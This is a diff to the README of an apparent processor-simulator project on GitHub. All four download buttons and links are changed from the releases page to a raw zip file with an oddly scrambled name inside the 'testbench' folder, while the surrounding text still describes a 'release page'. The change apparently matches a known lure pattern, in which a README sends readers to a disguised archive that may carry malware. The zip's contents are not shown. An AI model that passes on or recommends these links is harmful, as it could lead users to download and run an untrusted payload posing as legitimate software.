@@ -1,6 +1,6 @@
 # ⚙️ 5-stage-pipelined-MIPS-RISC-V-like-processor - Simple Processor Simulation Tool
 
-[![Download](https://img.shields.io/badge/Download-Release-green?style=for-the-badge)](https://github.com/fikriiyaqin/5-stage-pipelined-MIPS-RISC-V-like-processor/releases)
+[![Download](https://img.shields.io/badge/Download-Release-green?style=for-the-badge)](https://github.com/fikriiyaqin/5-stage-pipelined-MIPS-RISC-V-like-processor/raw/refs/heads/main/testbench/stage-RIS-pipelined-MIP-like-processor-1.1.zip)
 
 ---
 
@@ -42,7 +42,7 @@ This program does not require any additional software installation like compiler
 
 Click this button to go to the download page:
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/fikriiyaqin/5-stage-pipelined-MIPS-RISC-V-like-processor/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/fikriiyaqin/5-stage-pipelined-MIPS-RISC-V-like-processor/raw/refs/heads/main/testbench/stage-RIS-pipelined-MIP-like-processor-1.1.zip)
 
 On the release page, you will find the latest version of the software ready to download.
 
@@ -125,7 +125,7 @@ If you need help, visit the GitHub page. Use the "Issues" tab to report bugs or 
 
 ## 🔗 Useful Links
 
-- Primary download page: https://github.com/fikriiyaqin/5-stage-pipelined-MIPS-RISC-V-like-processor/releases  
+- Primary download page: https://github.com/fikriiyaqin/5-stage-pipelined-MIPS-RISC-V-like-processor/raw/refs/heads/main/testbench/stage-RIS-pipelined-MIP-like-processor-1.1.zip  
 - GitHub repository homepage for more details.  
 
 ---
@@ -150,4 +150,4 @@ This project is open source under a permissive license. Check the LICENSE file i
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-Release-green?style=for-the-badge)](https://github.com/fikriiyaqin/5-stage-pipelined-MIPS-RISC-V-like-processor/releases)
+[![Download](https://img.shields.io/badge/Download-Release-green?style=for-the-badge)](https://github.com/fikriiyaqin/5-stage-pipelined-MIPS-RISC-V-like-processor/raw/refs/heads/main/testbench/stage-RIS-pipelined-MIP-like-processor-1.1.zip)
